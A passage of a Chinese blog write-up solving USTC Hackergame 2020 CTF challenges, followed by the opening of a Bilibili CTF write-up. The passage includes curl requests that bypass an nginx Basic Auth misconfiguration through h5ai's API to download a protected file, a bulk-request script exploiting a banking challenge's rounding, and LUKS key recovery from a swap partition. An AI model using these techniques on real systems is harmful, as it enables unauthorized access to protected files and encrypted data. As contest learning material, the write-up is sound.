class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-title class_\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">'credit'|'debit'</span>} <span class=\"hljs-variable\">type</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) {    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">from</span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">to</span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">amount</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) {    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param</span> {<span class=\"hljs-type\">Number</span>} <span class=\"hljs-variable\">account</span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) {    <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">createCard</span>(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">transfer</span>(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">eatAndEndTheDay</span>(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.<span class=\"hljs-title function_\">json</span>();    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(resp.<span class=\"hljs-property\">flag</span>);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-section\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-section\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-section\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  <span class=\"hljs-variable\">$document_root</span><span class=\"hljs-variable\">$fastcgi_script_name</span>;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ <span class=\"hljs-built_in\">cat</span> flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">\"flag1\"</span>);            input.<span class=\"hljs-property\">value</span> = <span class=\"hljs-title class_\">String</span>(data.<span class=\"hljs-property\">data</span>);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span 